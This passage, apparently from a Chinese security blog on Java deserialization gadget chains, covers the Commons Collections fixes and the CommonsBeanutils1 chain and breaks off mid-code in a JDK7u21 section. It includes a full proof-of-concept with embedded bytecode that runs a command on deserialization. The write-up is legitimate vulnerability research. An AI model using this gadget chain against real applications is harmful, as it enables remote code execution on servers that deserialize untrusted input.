<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Entry&lt;K,V&gt; e = i.next();</span><br><span class="line"><span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> e.getKey();</span><br><span class="line"><span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> e.getValue();</span><br><span class="line"><span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!(m.get(key)==<span class="literal">null</span> &amp;&amp; m.containsKey(key)))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!value.equals(m.get(key)))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="修复情况"><a href="#修复情况" class="headerlink" title="修复情况"></a>修复情况</h2><p>Apache Commons Collections 官方在 2015 年底得知序列化相关的问题后，就在两个分支上同时发布了新的版本 4.1 和 3.2.2。</p>
<p>3.2.2 版代码中增加了一个方法 <code>FunctorUtils#checkUnsafeSerialization</code>，用于检测反序列化是否安全。如果开发者没有设置全局配置 <code>org.apache.commons.collections.enableUnsafeSerialization=true</code>，即默认情况下会抛出异常。</p>
<p>这个检查在常见的危险 <code>Transformer</code> 类（<code>InstantiateTransformer</code>、<code>InvokerTransformer</code>、<code>PrototypeFactory</code>、<code>CloneTransformer</code> 等）的 <code>readObject</code> 里进行调用。所以，当我们反序列化包含这些对象时就会抛出一个异常：</p>
<p><code>Serialization support for org.apache.commons.collections.functors.InvokerTransformer is disabled for security reasons. To enable it set system property &#39;org.apache.commons.collections.enableUnsafeSerialization&#39; to &#39;true&#39;, but you must ensure that your application does not de-serialize objects from untrusted sources.</code></p>
<p>在 4.1 版本，这几个危险 <code>Transformer</code> 类不再实现 <code>Serializable</code> 接口，也就是说，他们几个彻底无法序列化和反序列化了。</p>
<table>
<thead>
<tr>
<th align="left">CommonsCollections Gadget Chains</th>
<th align="left">CommonsCollection Version</th>
<th align="left">JDK Version</th>
<th align="left">Note</th>
</tr>
</thead>
<tbody><tr>
<td align="left">CommonsCollections1</td>
<td align="left">CommonsCollections 3.1 - 3.2.1</td>
<td align="left">1.7 （8u71之后已修复不可利用）</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">CommonsCollections2</td>
<td align="left">CommonsCollections 4.0</td>
<td align="left">暂无限制</td>
<td align="left">javassist</td>
</tr>
<tr>
<td align="left">CommonsCollections3</td>
<td align="left">CommonsCollections 3.1 - 3.2.1</td>
<td align="left">1.7 （8u71之后已修复不可利用）</td>
<td align="left">javassist</td>
</tr>
<tr>
<td align="left">CommonsCollections4</td>
<td align="left">CommonsCollections 4.0</td>
<td align="left">暂无限制</td>
<td align="left">javassist</td>
</tr>
<tr>
<td align="left">CommonsCollections5</td>
<td align="left">CommonsCollections 3.1 - 3.2.1</td>
<td align="left">1.8 8u76（实测8u181也可）</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">CommonsCollections6</td>
<td align="left">CommonsCollections 3.1 - 3.2.1</td>
<td align="left">暂无限制</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">CommonsCollections7</td>
<td align="left">CommonsCollections 3.1 - 3.2.1</td>
<td align="left">暂无限制</td>
<td align="left"></td>
</tr>
</tbody></table>
<h1 id="CommonsBeanutils"><a href="#CommonsBeanutils" class="headerlink" title="CommonsBeanutils"></a>CommonsBeanutils</h1><h2 id="CommonsBeanutils-概述"><a href="#CommonsBeanutils-概述" class="headerlink" title="CommonsBeanutils 概述"></a>CommonsBeanutils 概述</h2><p>Apache Commons Beanutils 是 Apache Commons 工具集下的另一个项目，它提供了对普通Java类对象（也称为 JavaBean）的一些操作方法。</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.8.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>commons-beanutils 中提供了一个静态方法 PropertyUtils.getProperty，让使用者可以直接调用任意 JavaBean 的 getter 方法。例如下面这段代码：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Example</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Bean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Bean</span>();</span><br><span class="line">        PropertyUtils.setProperty(bean, <span class="string">&quot;name&quot;</span>, <span class="string">&quot;Alice&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String) PropertyUtils.getProperty(bean, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Name: &quot;</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Bean</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123; <span class="keyword">return</span> name; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123; <span class="built_in">this</span>.name = name; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在执行 <code>PropertyUtils.getProperty(bean, &quot;name&quot;)</code> 时，commons-beanutils 会自动找到 <code>name</code> 属性的 getter 方法，也就是 getName，然后调用，获得返回值。</p>
<p>除此之外， <code>PropertyUtils.getProperty</code> 还支持递归获取属性，比如 <code>a</code> 对象中有属性 <code>b</code>，<code>b</code> 对象中有属性 <code>c</code>，我们可以通过 <code>PropertyUtils.getProperty(a, &quot;b.c&quot;);</code> 的方式进行递归获取。</p>
<p>通过这个方法，使用者可以很方便地调用任意对象的 getter，适用于在不确定 JavaBean 是哪个类对象时使用。</p>
<p>当然，commons-beanutils 中诸如此类的辅助方法还有很多，如调用 setter、拷贝属性等，这里不再细说。</p>
<h2 id="CommonsBeanutils1"><a href="#CommonsBeanutils1" class="headerlink" title="CommonsBeanutils1"></a>CommonsBeanutils1</h2><p>commons-beanutils 的 <code>org.apache.commons.beanutils.BeanComparator</code> 实现了 <code>java.util</code> 接口，它的 <code>compare</code> 方法会对待比较对象调用 <code>PropertyUtils.getProperty</code> 方法获取 <code>property</code> 属性。而 <code>TemplatesImpl#getOutputProperties</code> 可以触发字节码加载。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">( Object o1, Object o2 )</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ( property == <span class="literal">null</span> ) &#123;</span><br><span class="line">        <span class="comment">// compare the actual objects</span></span><br><span class="line">        <span class="keyword">return</span> comparator.compare( o1, o2 );</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> PropertyUtils.getProperty( o1, property );</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> PropertyUtils.getProperty( o2, property );</span><br><span class="line">        <span class="keyword">return</span> comparator.compare( value1, value2 );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( IllegalAccessException iae ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>( <span class="string">&quot;IllegalAccessException: &quot;</span> + iae.toString() );</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span> ( InvocationTargetException ite ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>( <span class="string">&quot;InvocationTargetException: &quot;</span> + ite.toString() );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( NoSuchMethodException nsme ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>( <span class="string">&quot;NoSuchMethodException: &quot;</span> + nsme.toString() );</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此我们可以借鉴 CC2 的思路在 <code>PriorityQueue</code> 中放两个 <code>TemplatesImpl</code> 并且设置 <code>BeanComparator</code> 为 <code>PriorityQueue</code> 的比较方式。此时如果我们设置 <code>BeanComparator</code> 的 <code>property</code> 属性为 <code>outputProperties</code> 则在反序列化触发 <code>BeanComparator#compare</code> 时会通过 <code>PropertyUtils.getProperty</code> 调用到 <code>TemplatesImpl#getOutputProperties</code> 进而实现任意字节码加载。</p>
<p>poc 如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsBeanutils1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQAxTGNvbS9leGFtcGxlL1Rlc3RUcmFuc2Zvcm1lciRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAUVGVzdFRyYW5zZm9ybWVyLmphdmEMAAoACwcAKAEAL2NvbS9leGFtcGxlL1Rlc3RUcmFuc2Zvcm1lciRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAbY29tL2V4YW1wbGUvVGVzdFRyYW5zZm9ybWVyAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAEY2FsYwgAMAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMADIAMwoAKwA0AQANU3RhY2tNYXBUYWJsZQEAHnlzb3NlcmlhbC9Qd25lcjU0MDQzOTYxNzA2NjcwMAEAIEx5c29zZXJpYWwvUHduZXI1NDA0Mzk2MTcwNjY3MDA7ACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAHAAOAAAADAABAAAABQAPADgAAAABABMAFAACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAAIgAOAAAAIAADAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABcAGAACABkAAAAEAAEAGgABABMAGwACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAJwAOAAAAKgAEAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABwAHQACAAAAAQAeAB8AAwAZAAAABAABABoACAApAAsAAQAMAAAAJAADAAIAAAAPpwADAUy4AC8SMbYANVexAAAAAQA2AAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJ&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line">        PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(queue);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>调用栈如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">defineClass:142, TemplatesImpl$TransletClassLoader (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">defineTransletClasses:346, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getTransletInstance:383, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:418, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getOutputProperties:439, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">...</span><br><span class="line">getProperty:426, PropertyUtils (org.apache.commons.beanutils)</span><br><span class="line">compare:157, BeanComparator (org.apache.commons.beanutils)</span><br><span class="line">siftDownUsingComparator:721, PriorityQueue (java.util)</span><br><span class="line">siftDown:687, PriorityQueue (java.util)</span><br><span class="line">heapify:736, PriorityQueue (java.util)</span><br><span class="line">readObject:795, PriorityQueue (java.util)</span><br><span class="line">...</span><br><span class="line">main:38, CommonsBeanutils1 (com.example)</span><br></pre></td></tr></table></figure></div>

<p>这里需要注意 <code>BeanComparator</code> 的构造方法有两个，如果没有指定 <code>Comparator</code> 默认会使用 <code>org.apache.commons.collections.comparators.ComparableComparator</code>。这样改利用链会依赖于 commons-collections 库。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">BeanComparator</span><span class="params">( String property )</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>( property, ComparableComparator.getInstance() );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">BeanComparator</span><span class="params">( String property, Comparator comparator )</span> &#123;</span><br><span class="line">    setProperty( property );</span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.comparator = comparator;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.comparator = ComparableComparator.getInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>为了避免这种依赖关系从而提高利用链的通用性，我们需要找到一个类来替换 <code>ComparableComparator</code>，它需要满足下面这几个条件：</p>
<ul>
<li>实现 <code>java.util.Comparator</code> 接口</li>
<li>实现 <code>java.io.Serializable</code> 接口</li>
<li>Java、shiro 或 commons-beanutils 自带，且兼容性强。</li>
</ul>
<p>实际上有很多类都满足这个条件，这里我选择的是 <code>CaseInsensitiveComparator</code>，可以通过 <code>String.CASE_INSENSITIVE_ORDER</code>  获取。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/105e5cae598e4a888081c4dcf0b3919e-1735752042713-3.png"
                      alt="在这里插入图片描述"
                ></p>
<h1 id="原生反序列化利用链"><a href="#原生反序列化利用链" class="headerlink" title="原生反序列化利用链"></a>原生反序列化利用链</h1><p>主要是一些不依赖第三方库的 Java 反序列化利用链。</p>
<h2 id="JDK7u21"><a href="#JDK7u21" class="headerlink" title="JDK7u21"></a>JDK7u21</h2><p><code>AnnotationInvocationHandler</code> 类中的 <code>equalsImpl</code> 方法在参数 <code>Object o</code> 不是 <code>AnnotationInvocationHandler</code> 的实现类代理的对象时会获取 <code>AnnotationInvocationHandler#type</code> 中的所有方法，然后依次调用 <code>o</code> 中的这些方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> AnnotationInvocationHandler <span class="title function_">asOneOfUs</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (Proxy.isProxyClass(o.getClass())) &#123;</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> Proxy.getInvocationHandler(o);</span><br><span class="line">        <span class="keyword">if</span> (handler <span class="keyword">instanceof</span> AnnotationInvocationHandler)</span><br><span class="line">            <span class="keyword">return</span> (AnnotationInvocationHandler) handler;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> Method[] getMemberMethods() &#123;</span><br><span class="line">    <span class="keyword">if</span> (memberMethods == <span class="literal">null</span>) &#123;</span><br><span class="line">        memberMethods = AccessController.doPrivileged(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Method[]&gt;() &#123;</span><br><span class="line">                <span class="keyword">public</span> Method[] run() &#123;</span><br><span class="line">                    <span class="keyword">final</span> Method[] mm = type.getDeclaredMethods();</span><br><span class="line">                    validateAnnotationMethods(mm);</span><br><span class="line">                    AccessibleObject.setAccessible(mm, <span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">return</span> mm;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> memberMethods;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="keyword">volatile</span> Method[] memberMethods = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> Boolean <span class="title function_">equalsImpl</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (o == <span class="built_in">this</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!type.isInstance(o))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (Method memberMethod : getMemberMethods()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">member</span> <span class="operator">=</span> memberMethod.getName();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">ourValue</span> <span class="operator">=</span> memberValues.get(member);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">hisValue</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">AnnotationInvocationHandler</span> <span class="variable">hisHandler</span> <span class="operator">=</span> asOneOfUs(o);</span><br><span class="line">        <span class="keyword">if</span> (hisHandler != <span class="literal">null</span>) &#123;</span><br><span class="line">            hisValue = hisHandler.memberValues.get(member);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                hisValue = memberMethod.invoke(o); <span class="comment">// 调用 o 的所有方法</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!memberValueEquals(ourValue, hisValue))</span><br><span class="line">            <span 